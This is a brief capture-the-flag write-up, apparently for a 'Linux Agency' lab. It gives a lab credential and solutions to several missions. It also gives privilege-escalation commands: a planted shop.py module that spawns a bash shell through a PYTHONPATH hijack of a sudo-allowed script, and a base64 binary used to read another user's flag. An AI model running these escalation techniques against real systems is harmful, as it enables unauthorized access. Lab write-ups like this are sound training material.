# Linux Agency

## Creds

```txt
agent47:640509040147
```

## Linux Fundamentals

### Misssion 11

```bash
cat $(find . -type f) | grep mission11*
```

### Misssion 18

```bash
javac flag.java
java flag
```

### Misssion 28

```ruby
exec '/bin/bash'
cat txt.galf | rev
```

## Privilege Escalation

### Jordan's flag

Doing `sudo -l` we can see that jordan can run a script

```bash
(jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
```

Trying to run the script gives us this error:

```bash
import shop
ModuleNotFoundError: No module named 'shop'
```

This means that the script needs a library called shop in order to run.

Let's create this `shop.py` script and add it to the python path.

```bash
touch /tmp/shop.py
echo "import os" > shop.py
echo "os.system('/bin/bash')" >> shop.py
#echo "import pty;pty.spawn('/bin/bash')" > shop.py
```

And run it with the specified python PATH.

```bash
sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
```

### Maya's flag

```bash
LFILE=/home/maya/flag.txt
./base64 "$LFILE" | base64 -d
```

```json
```
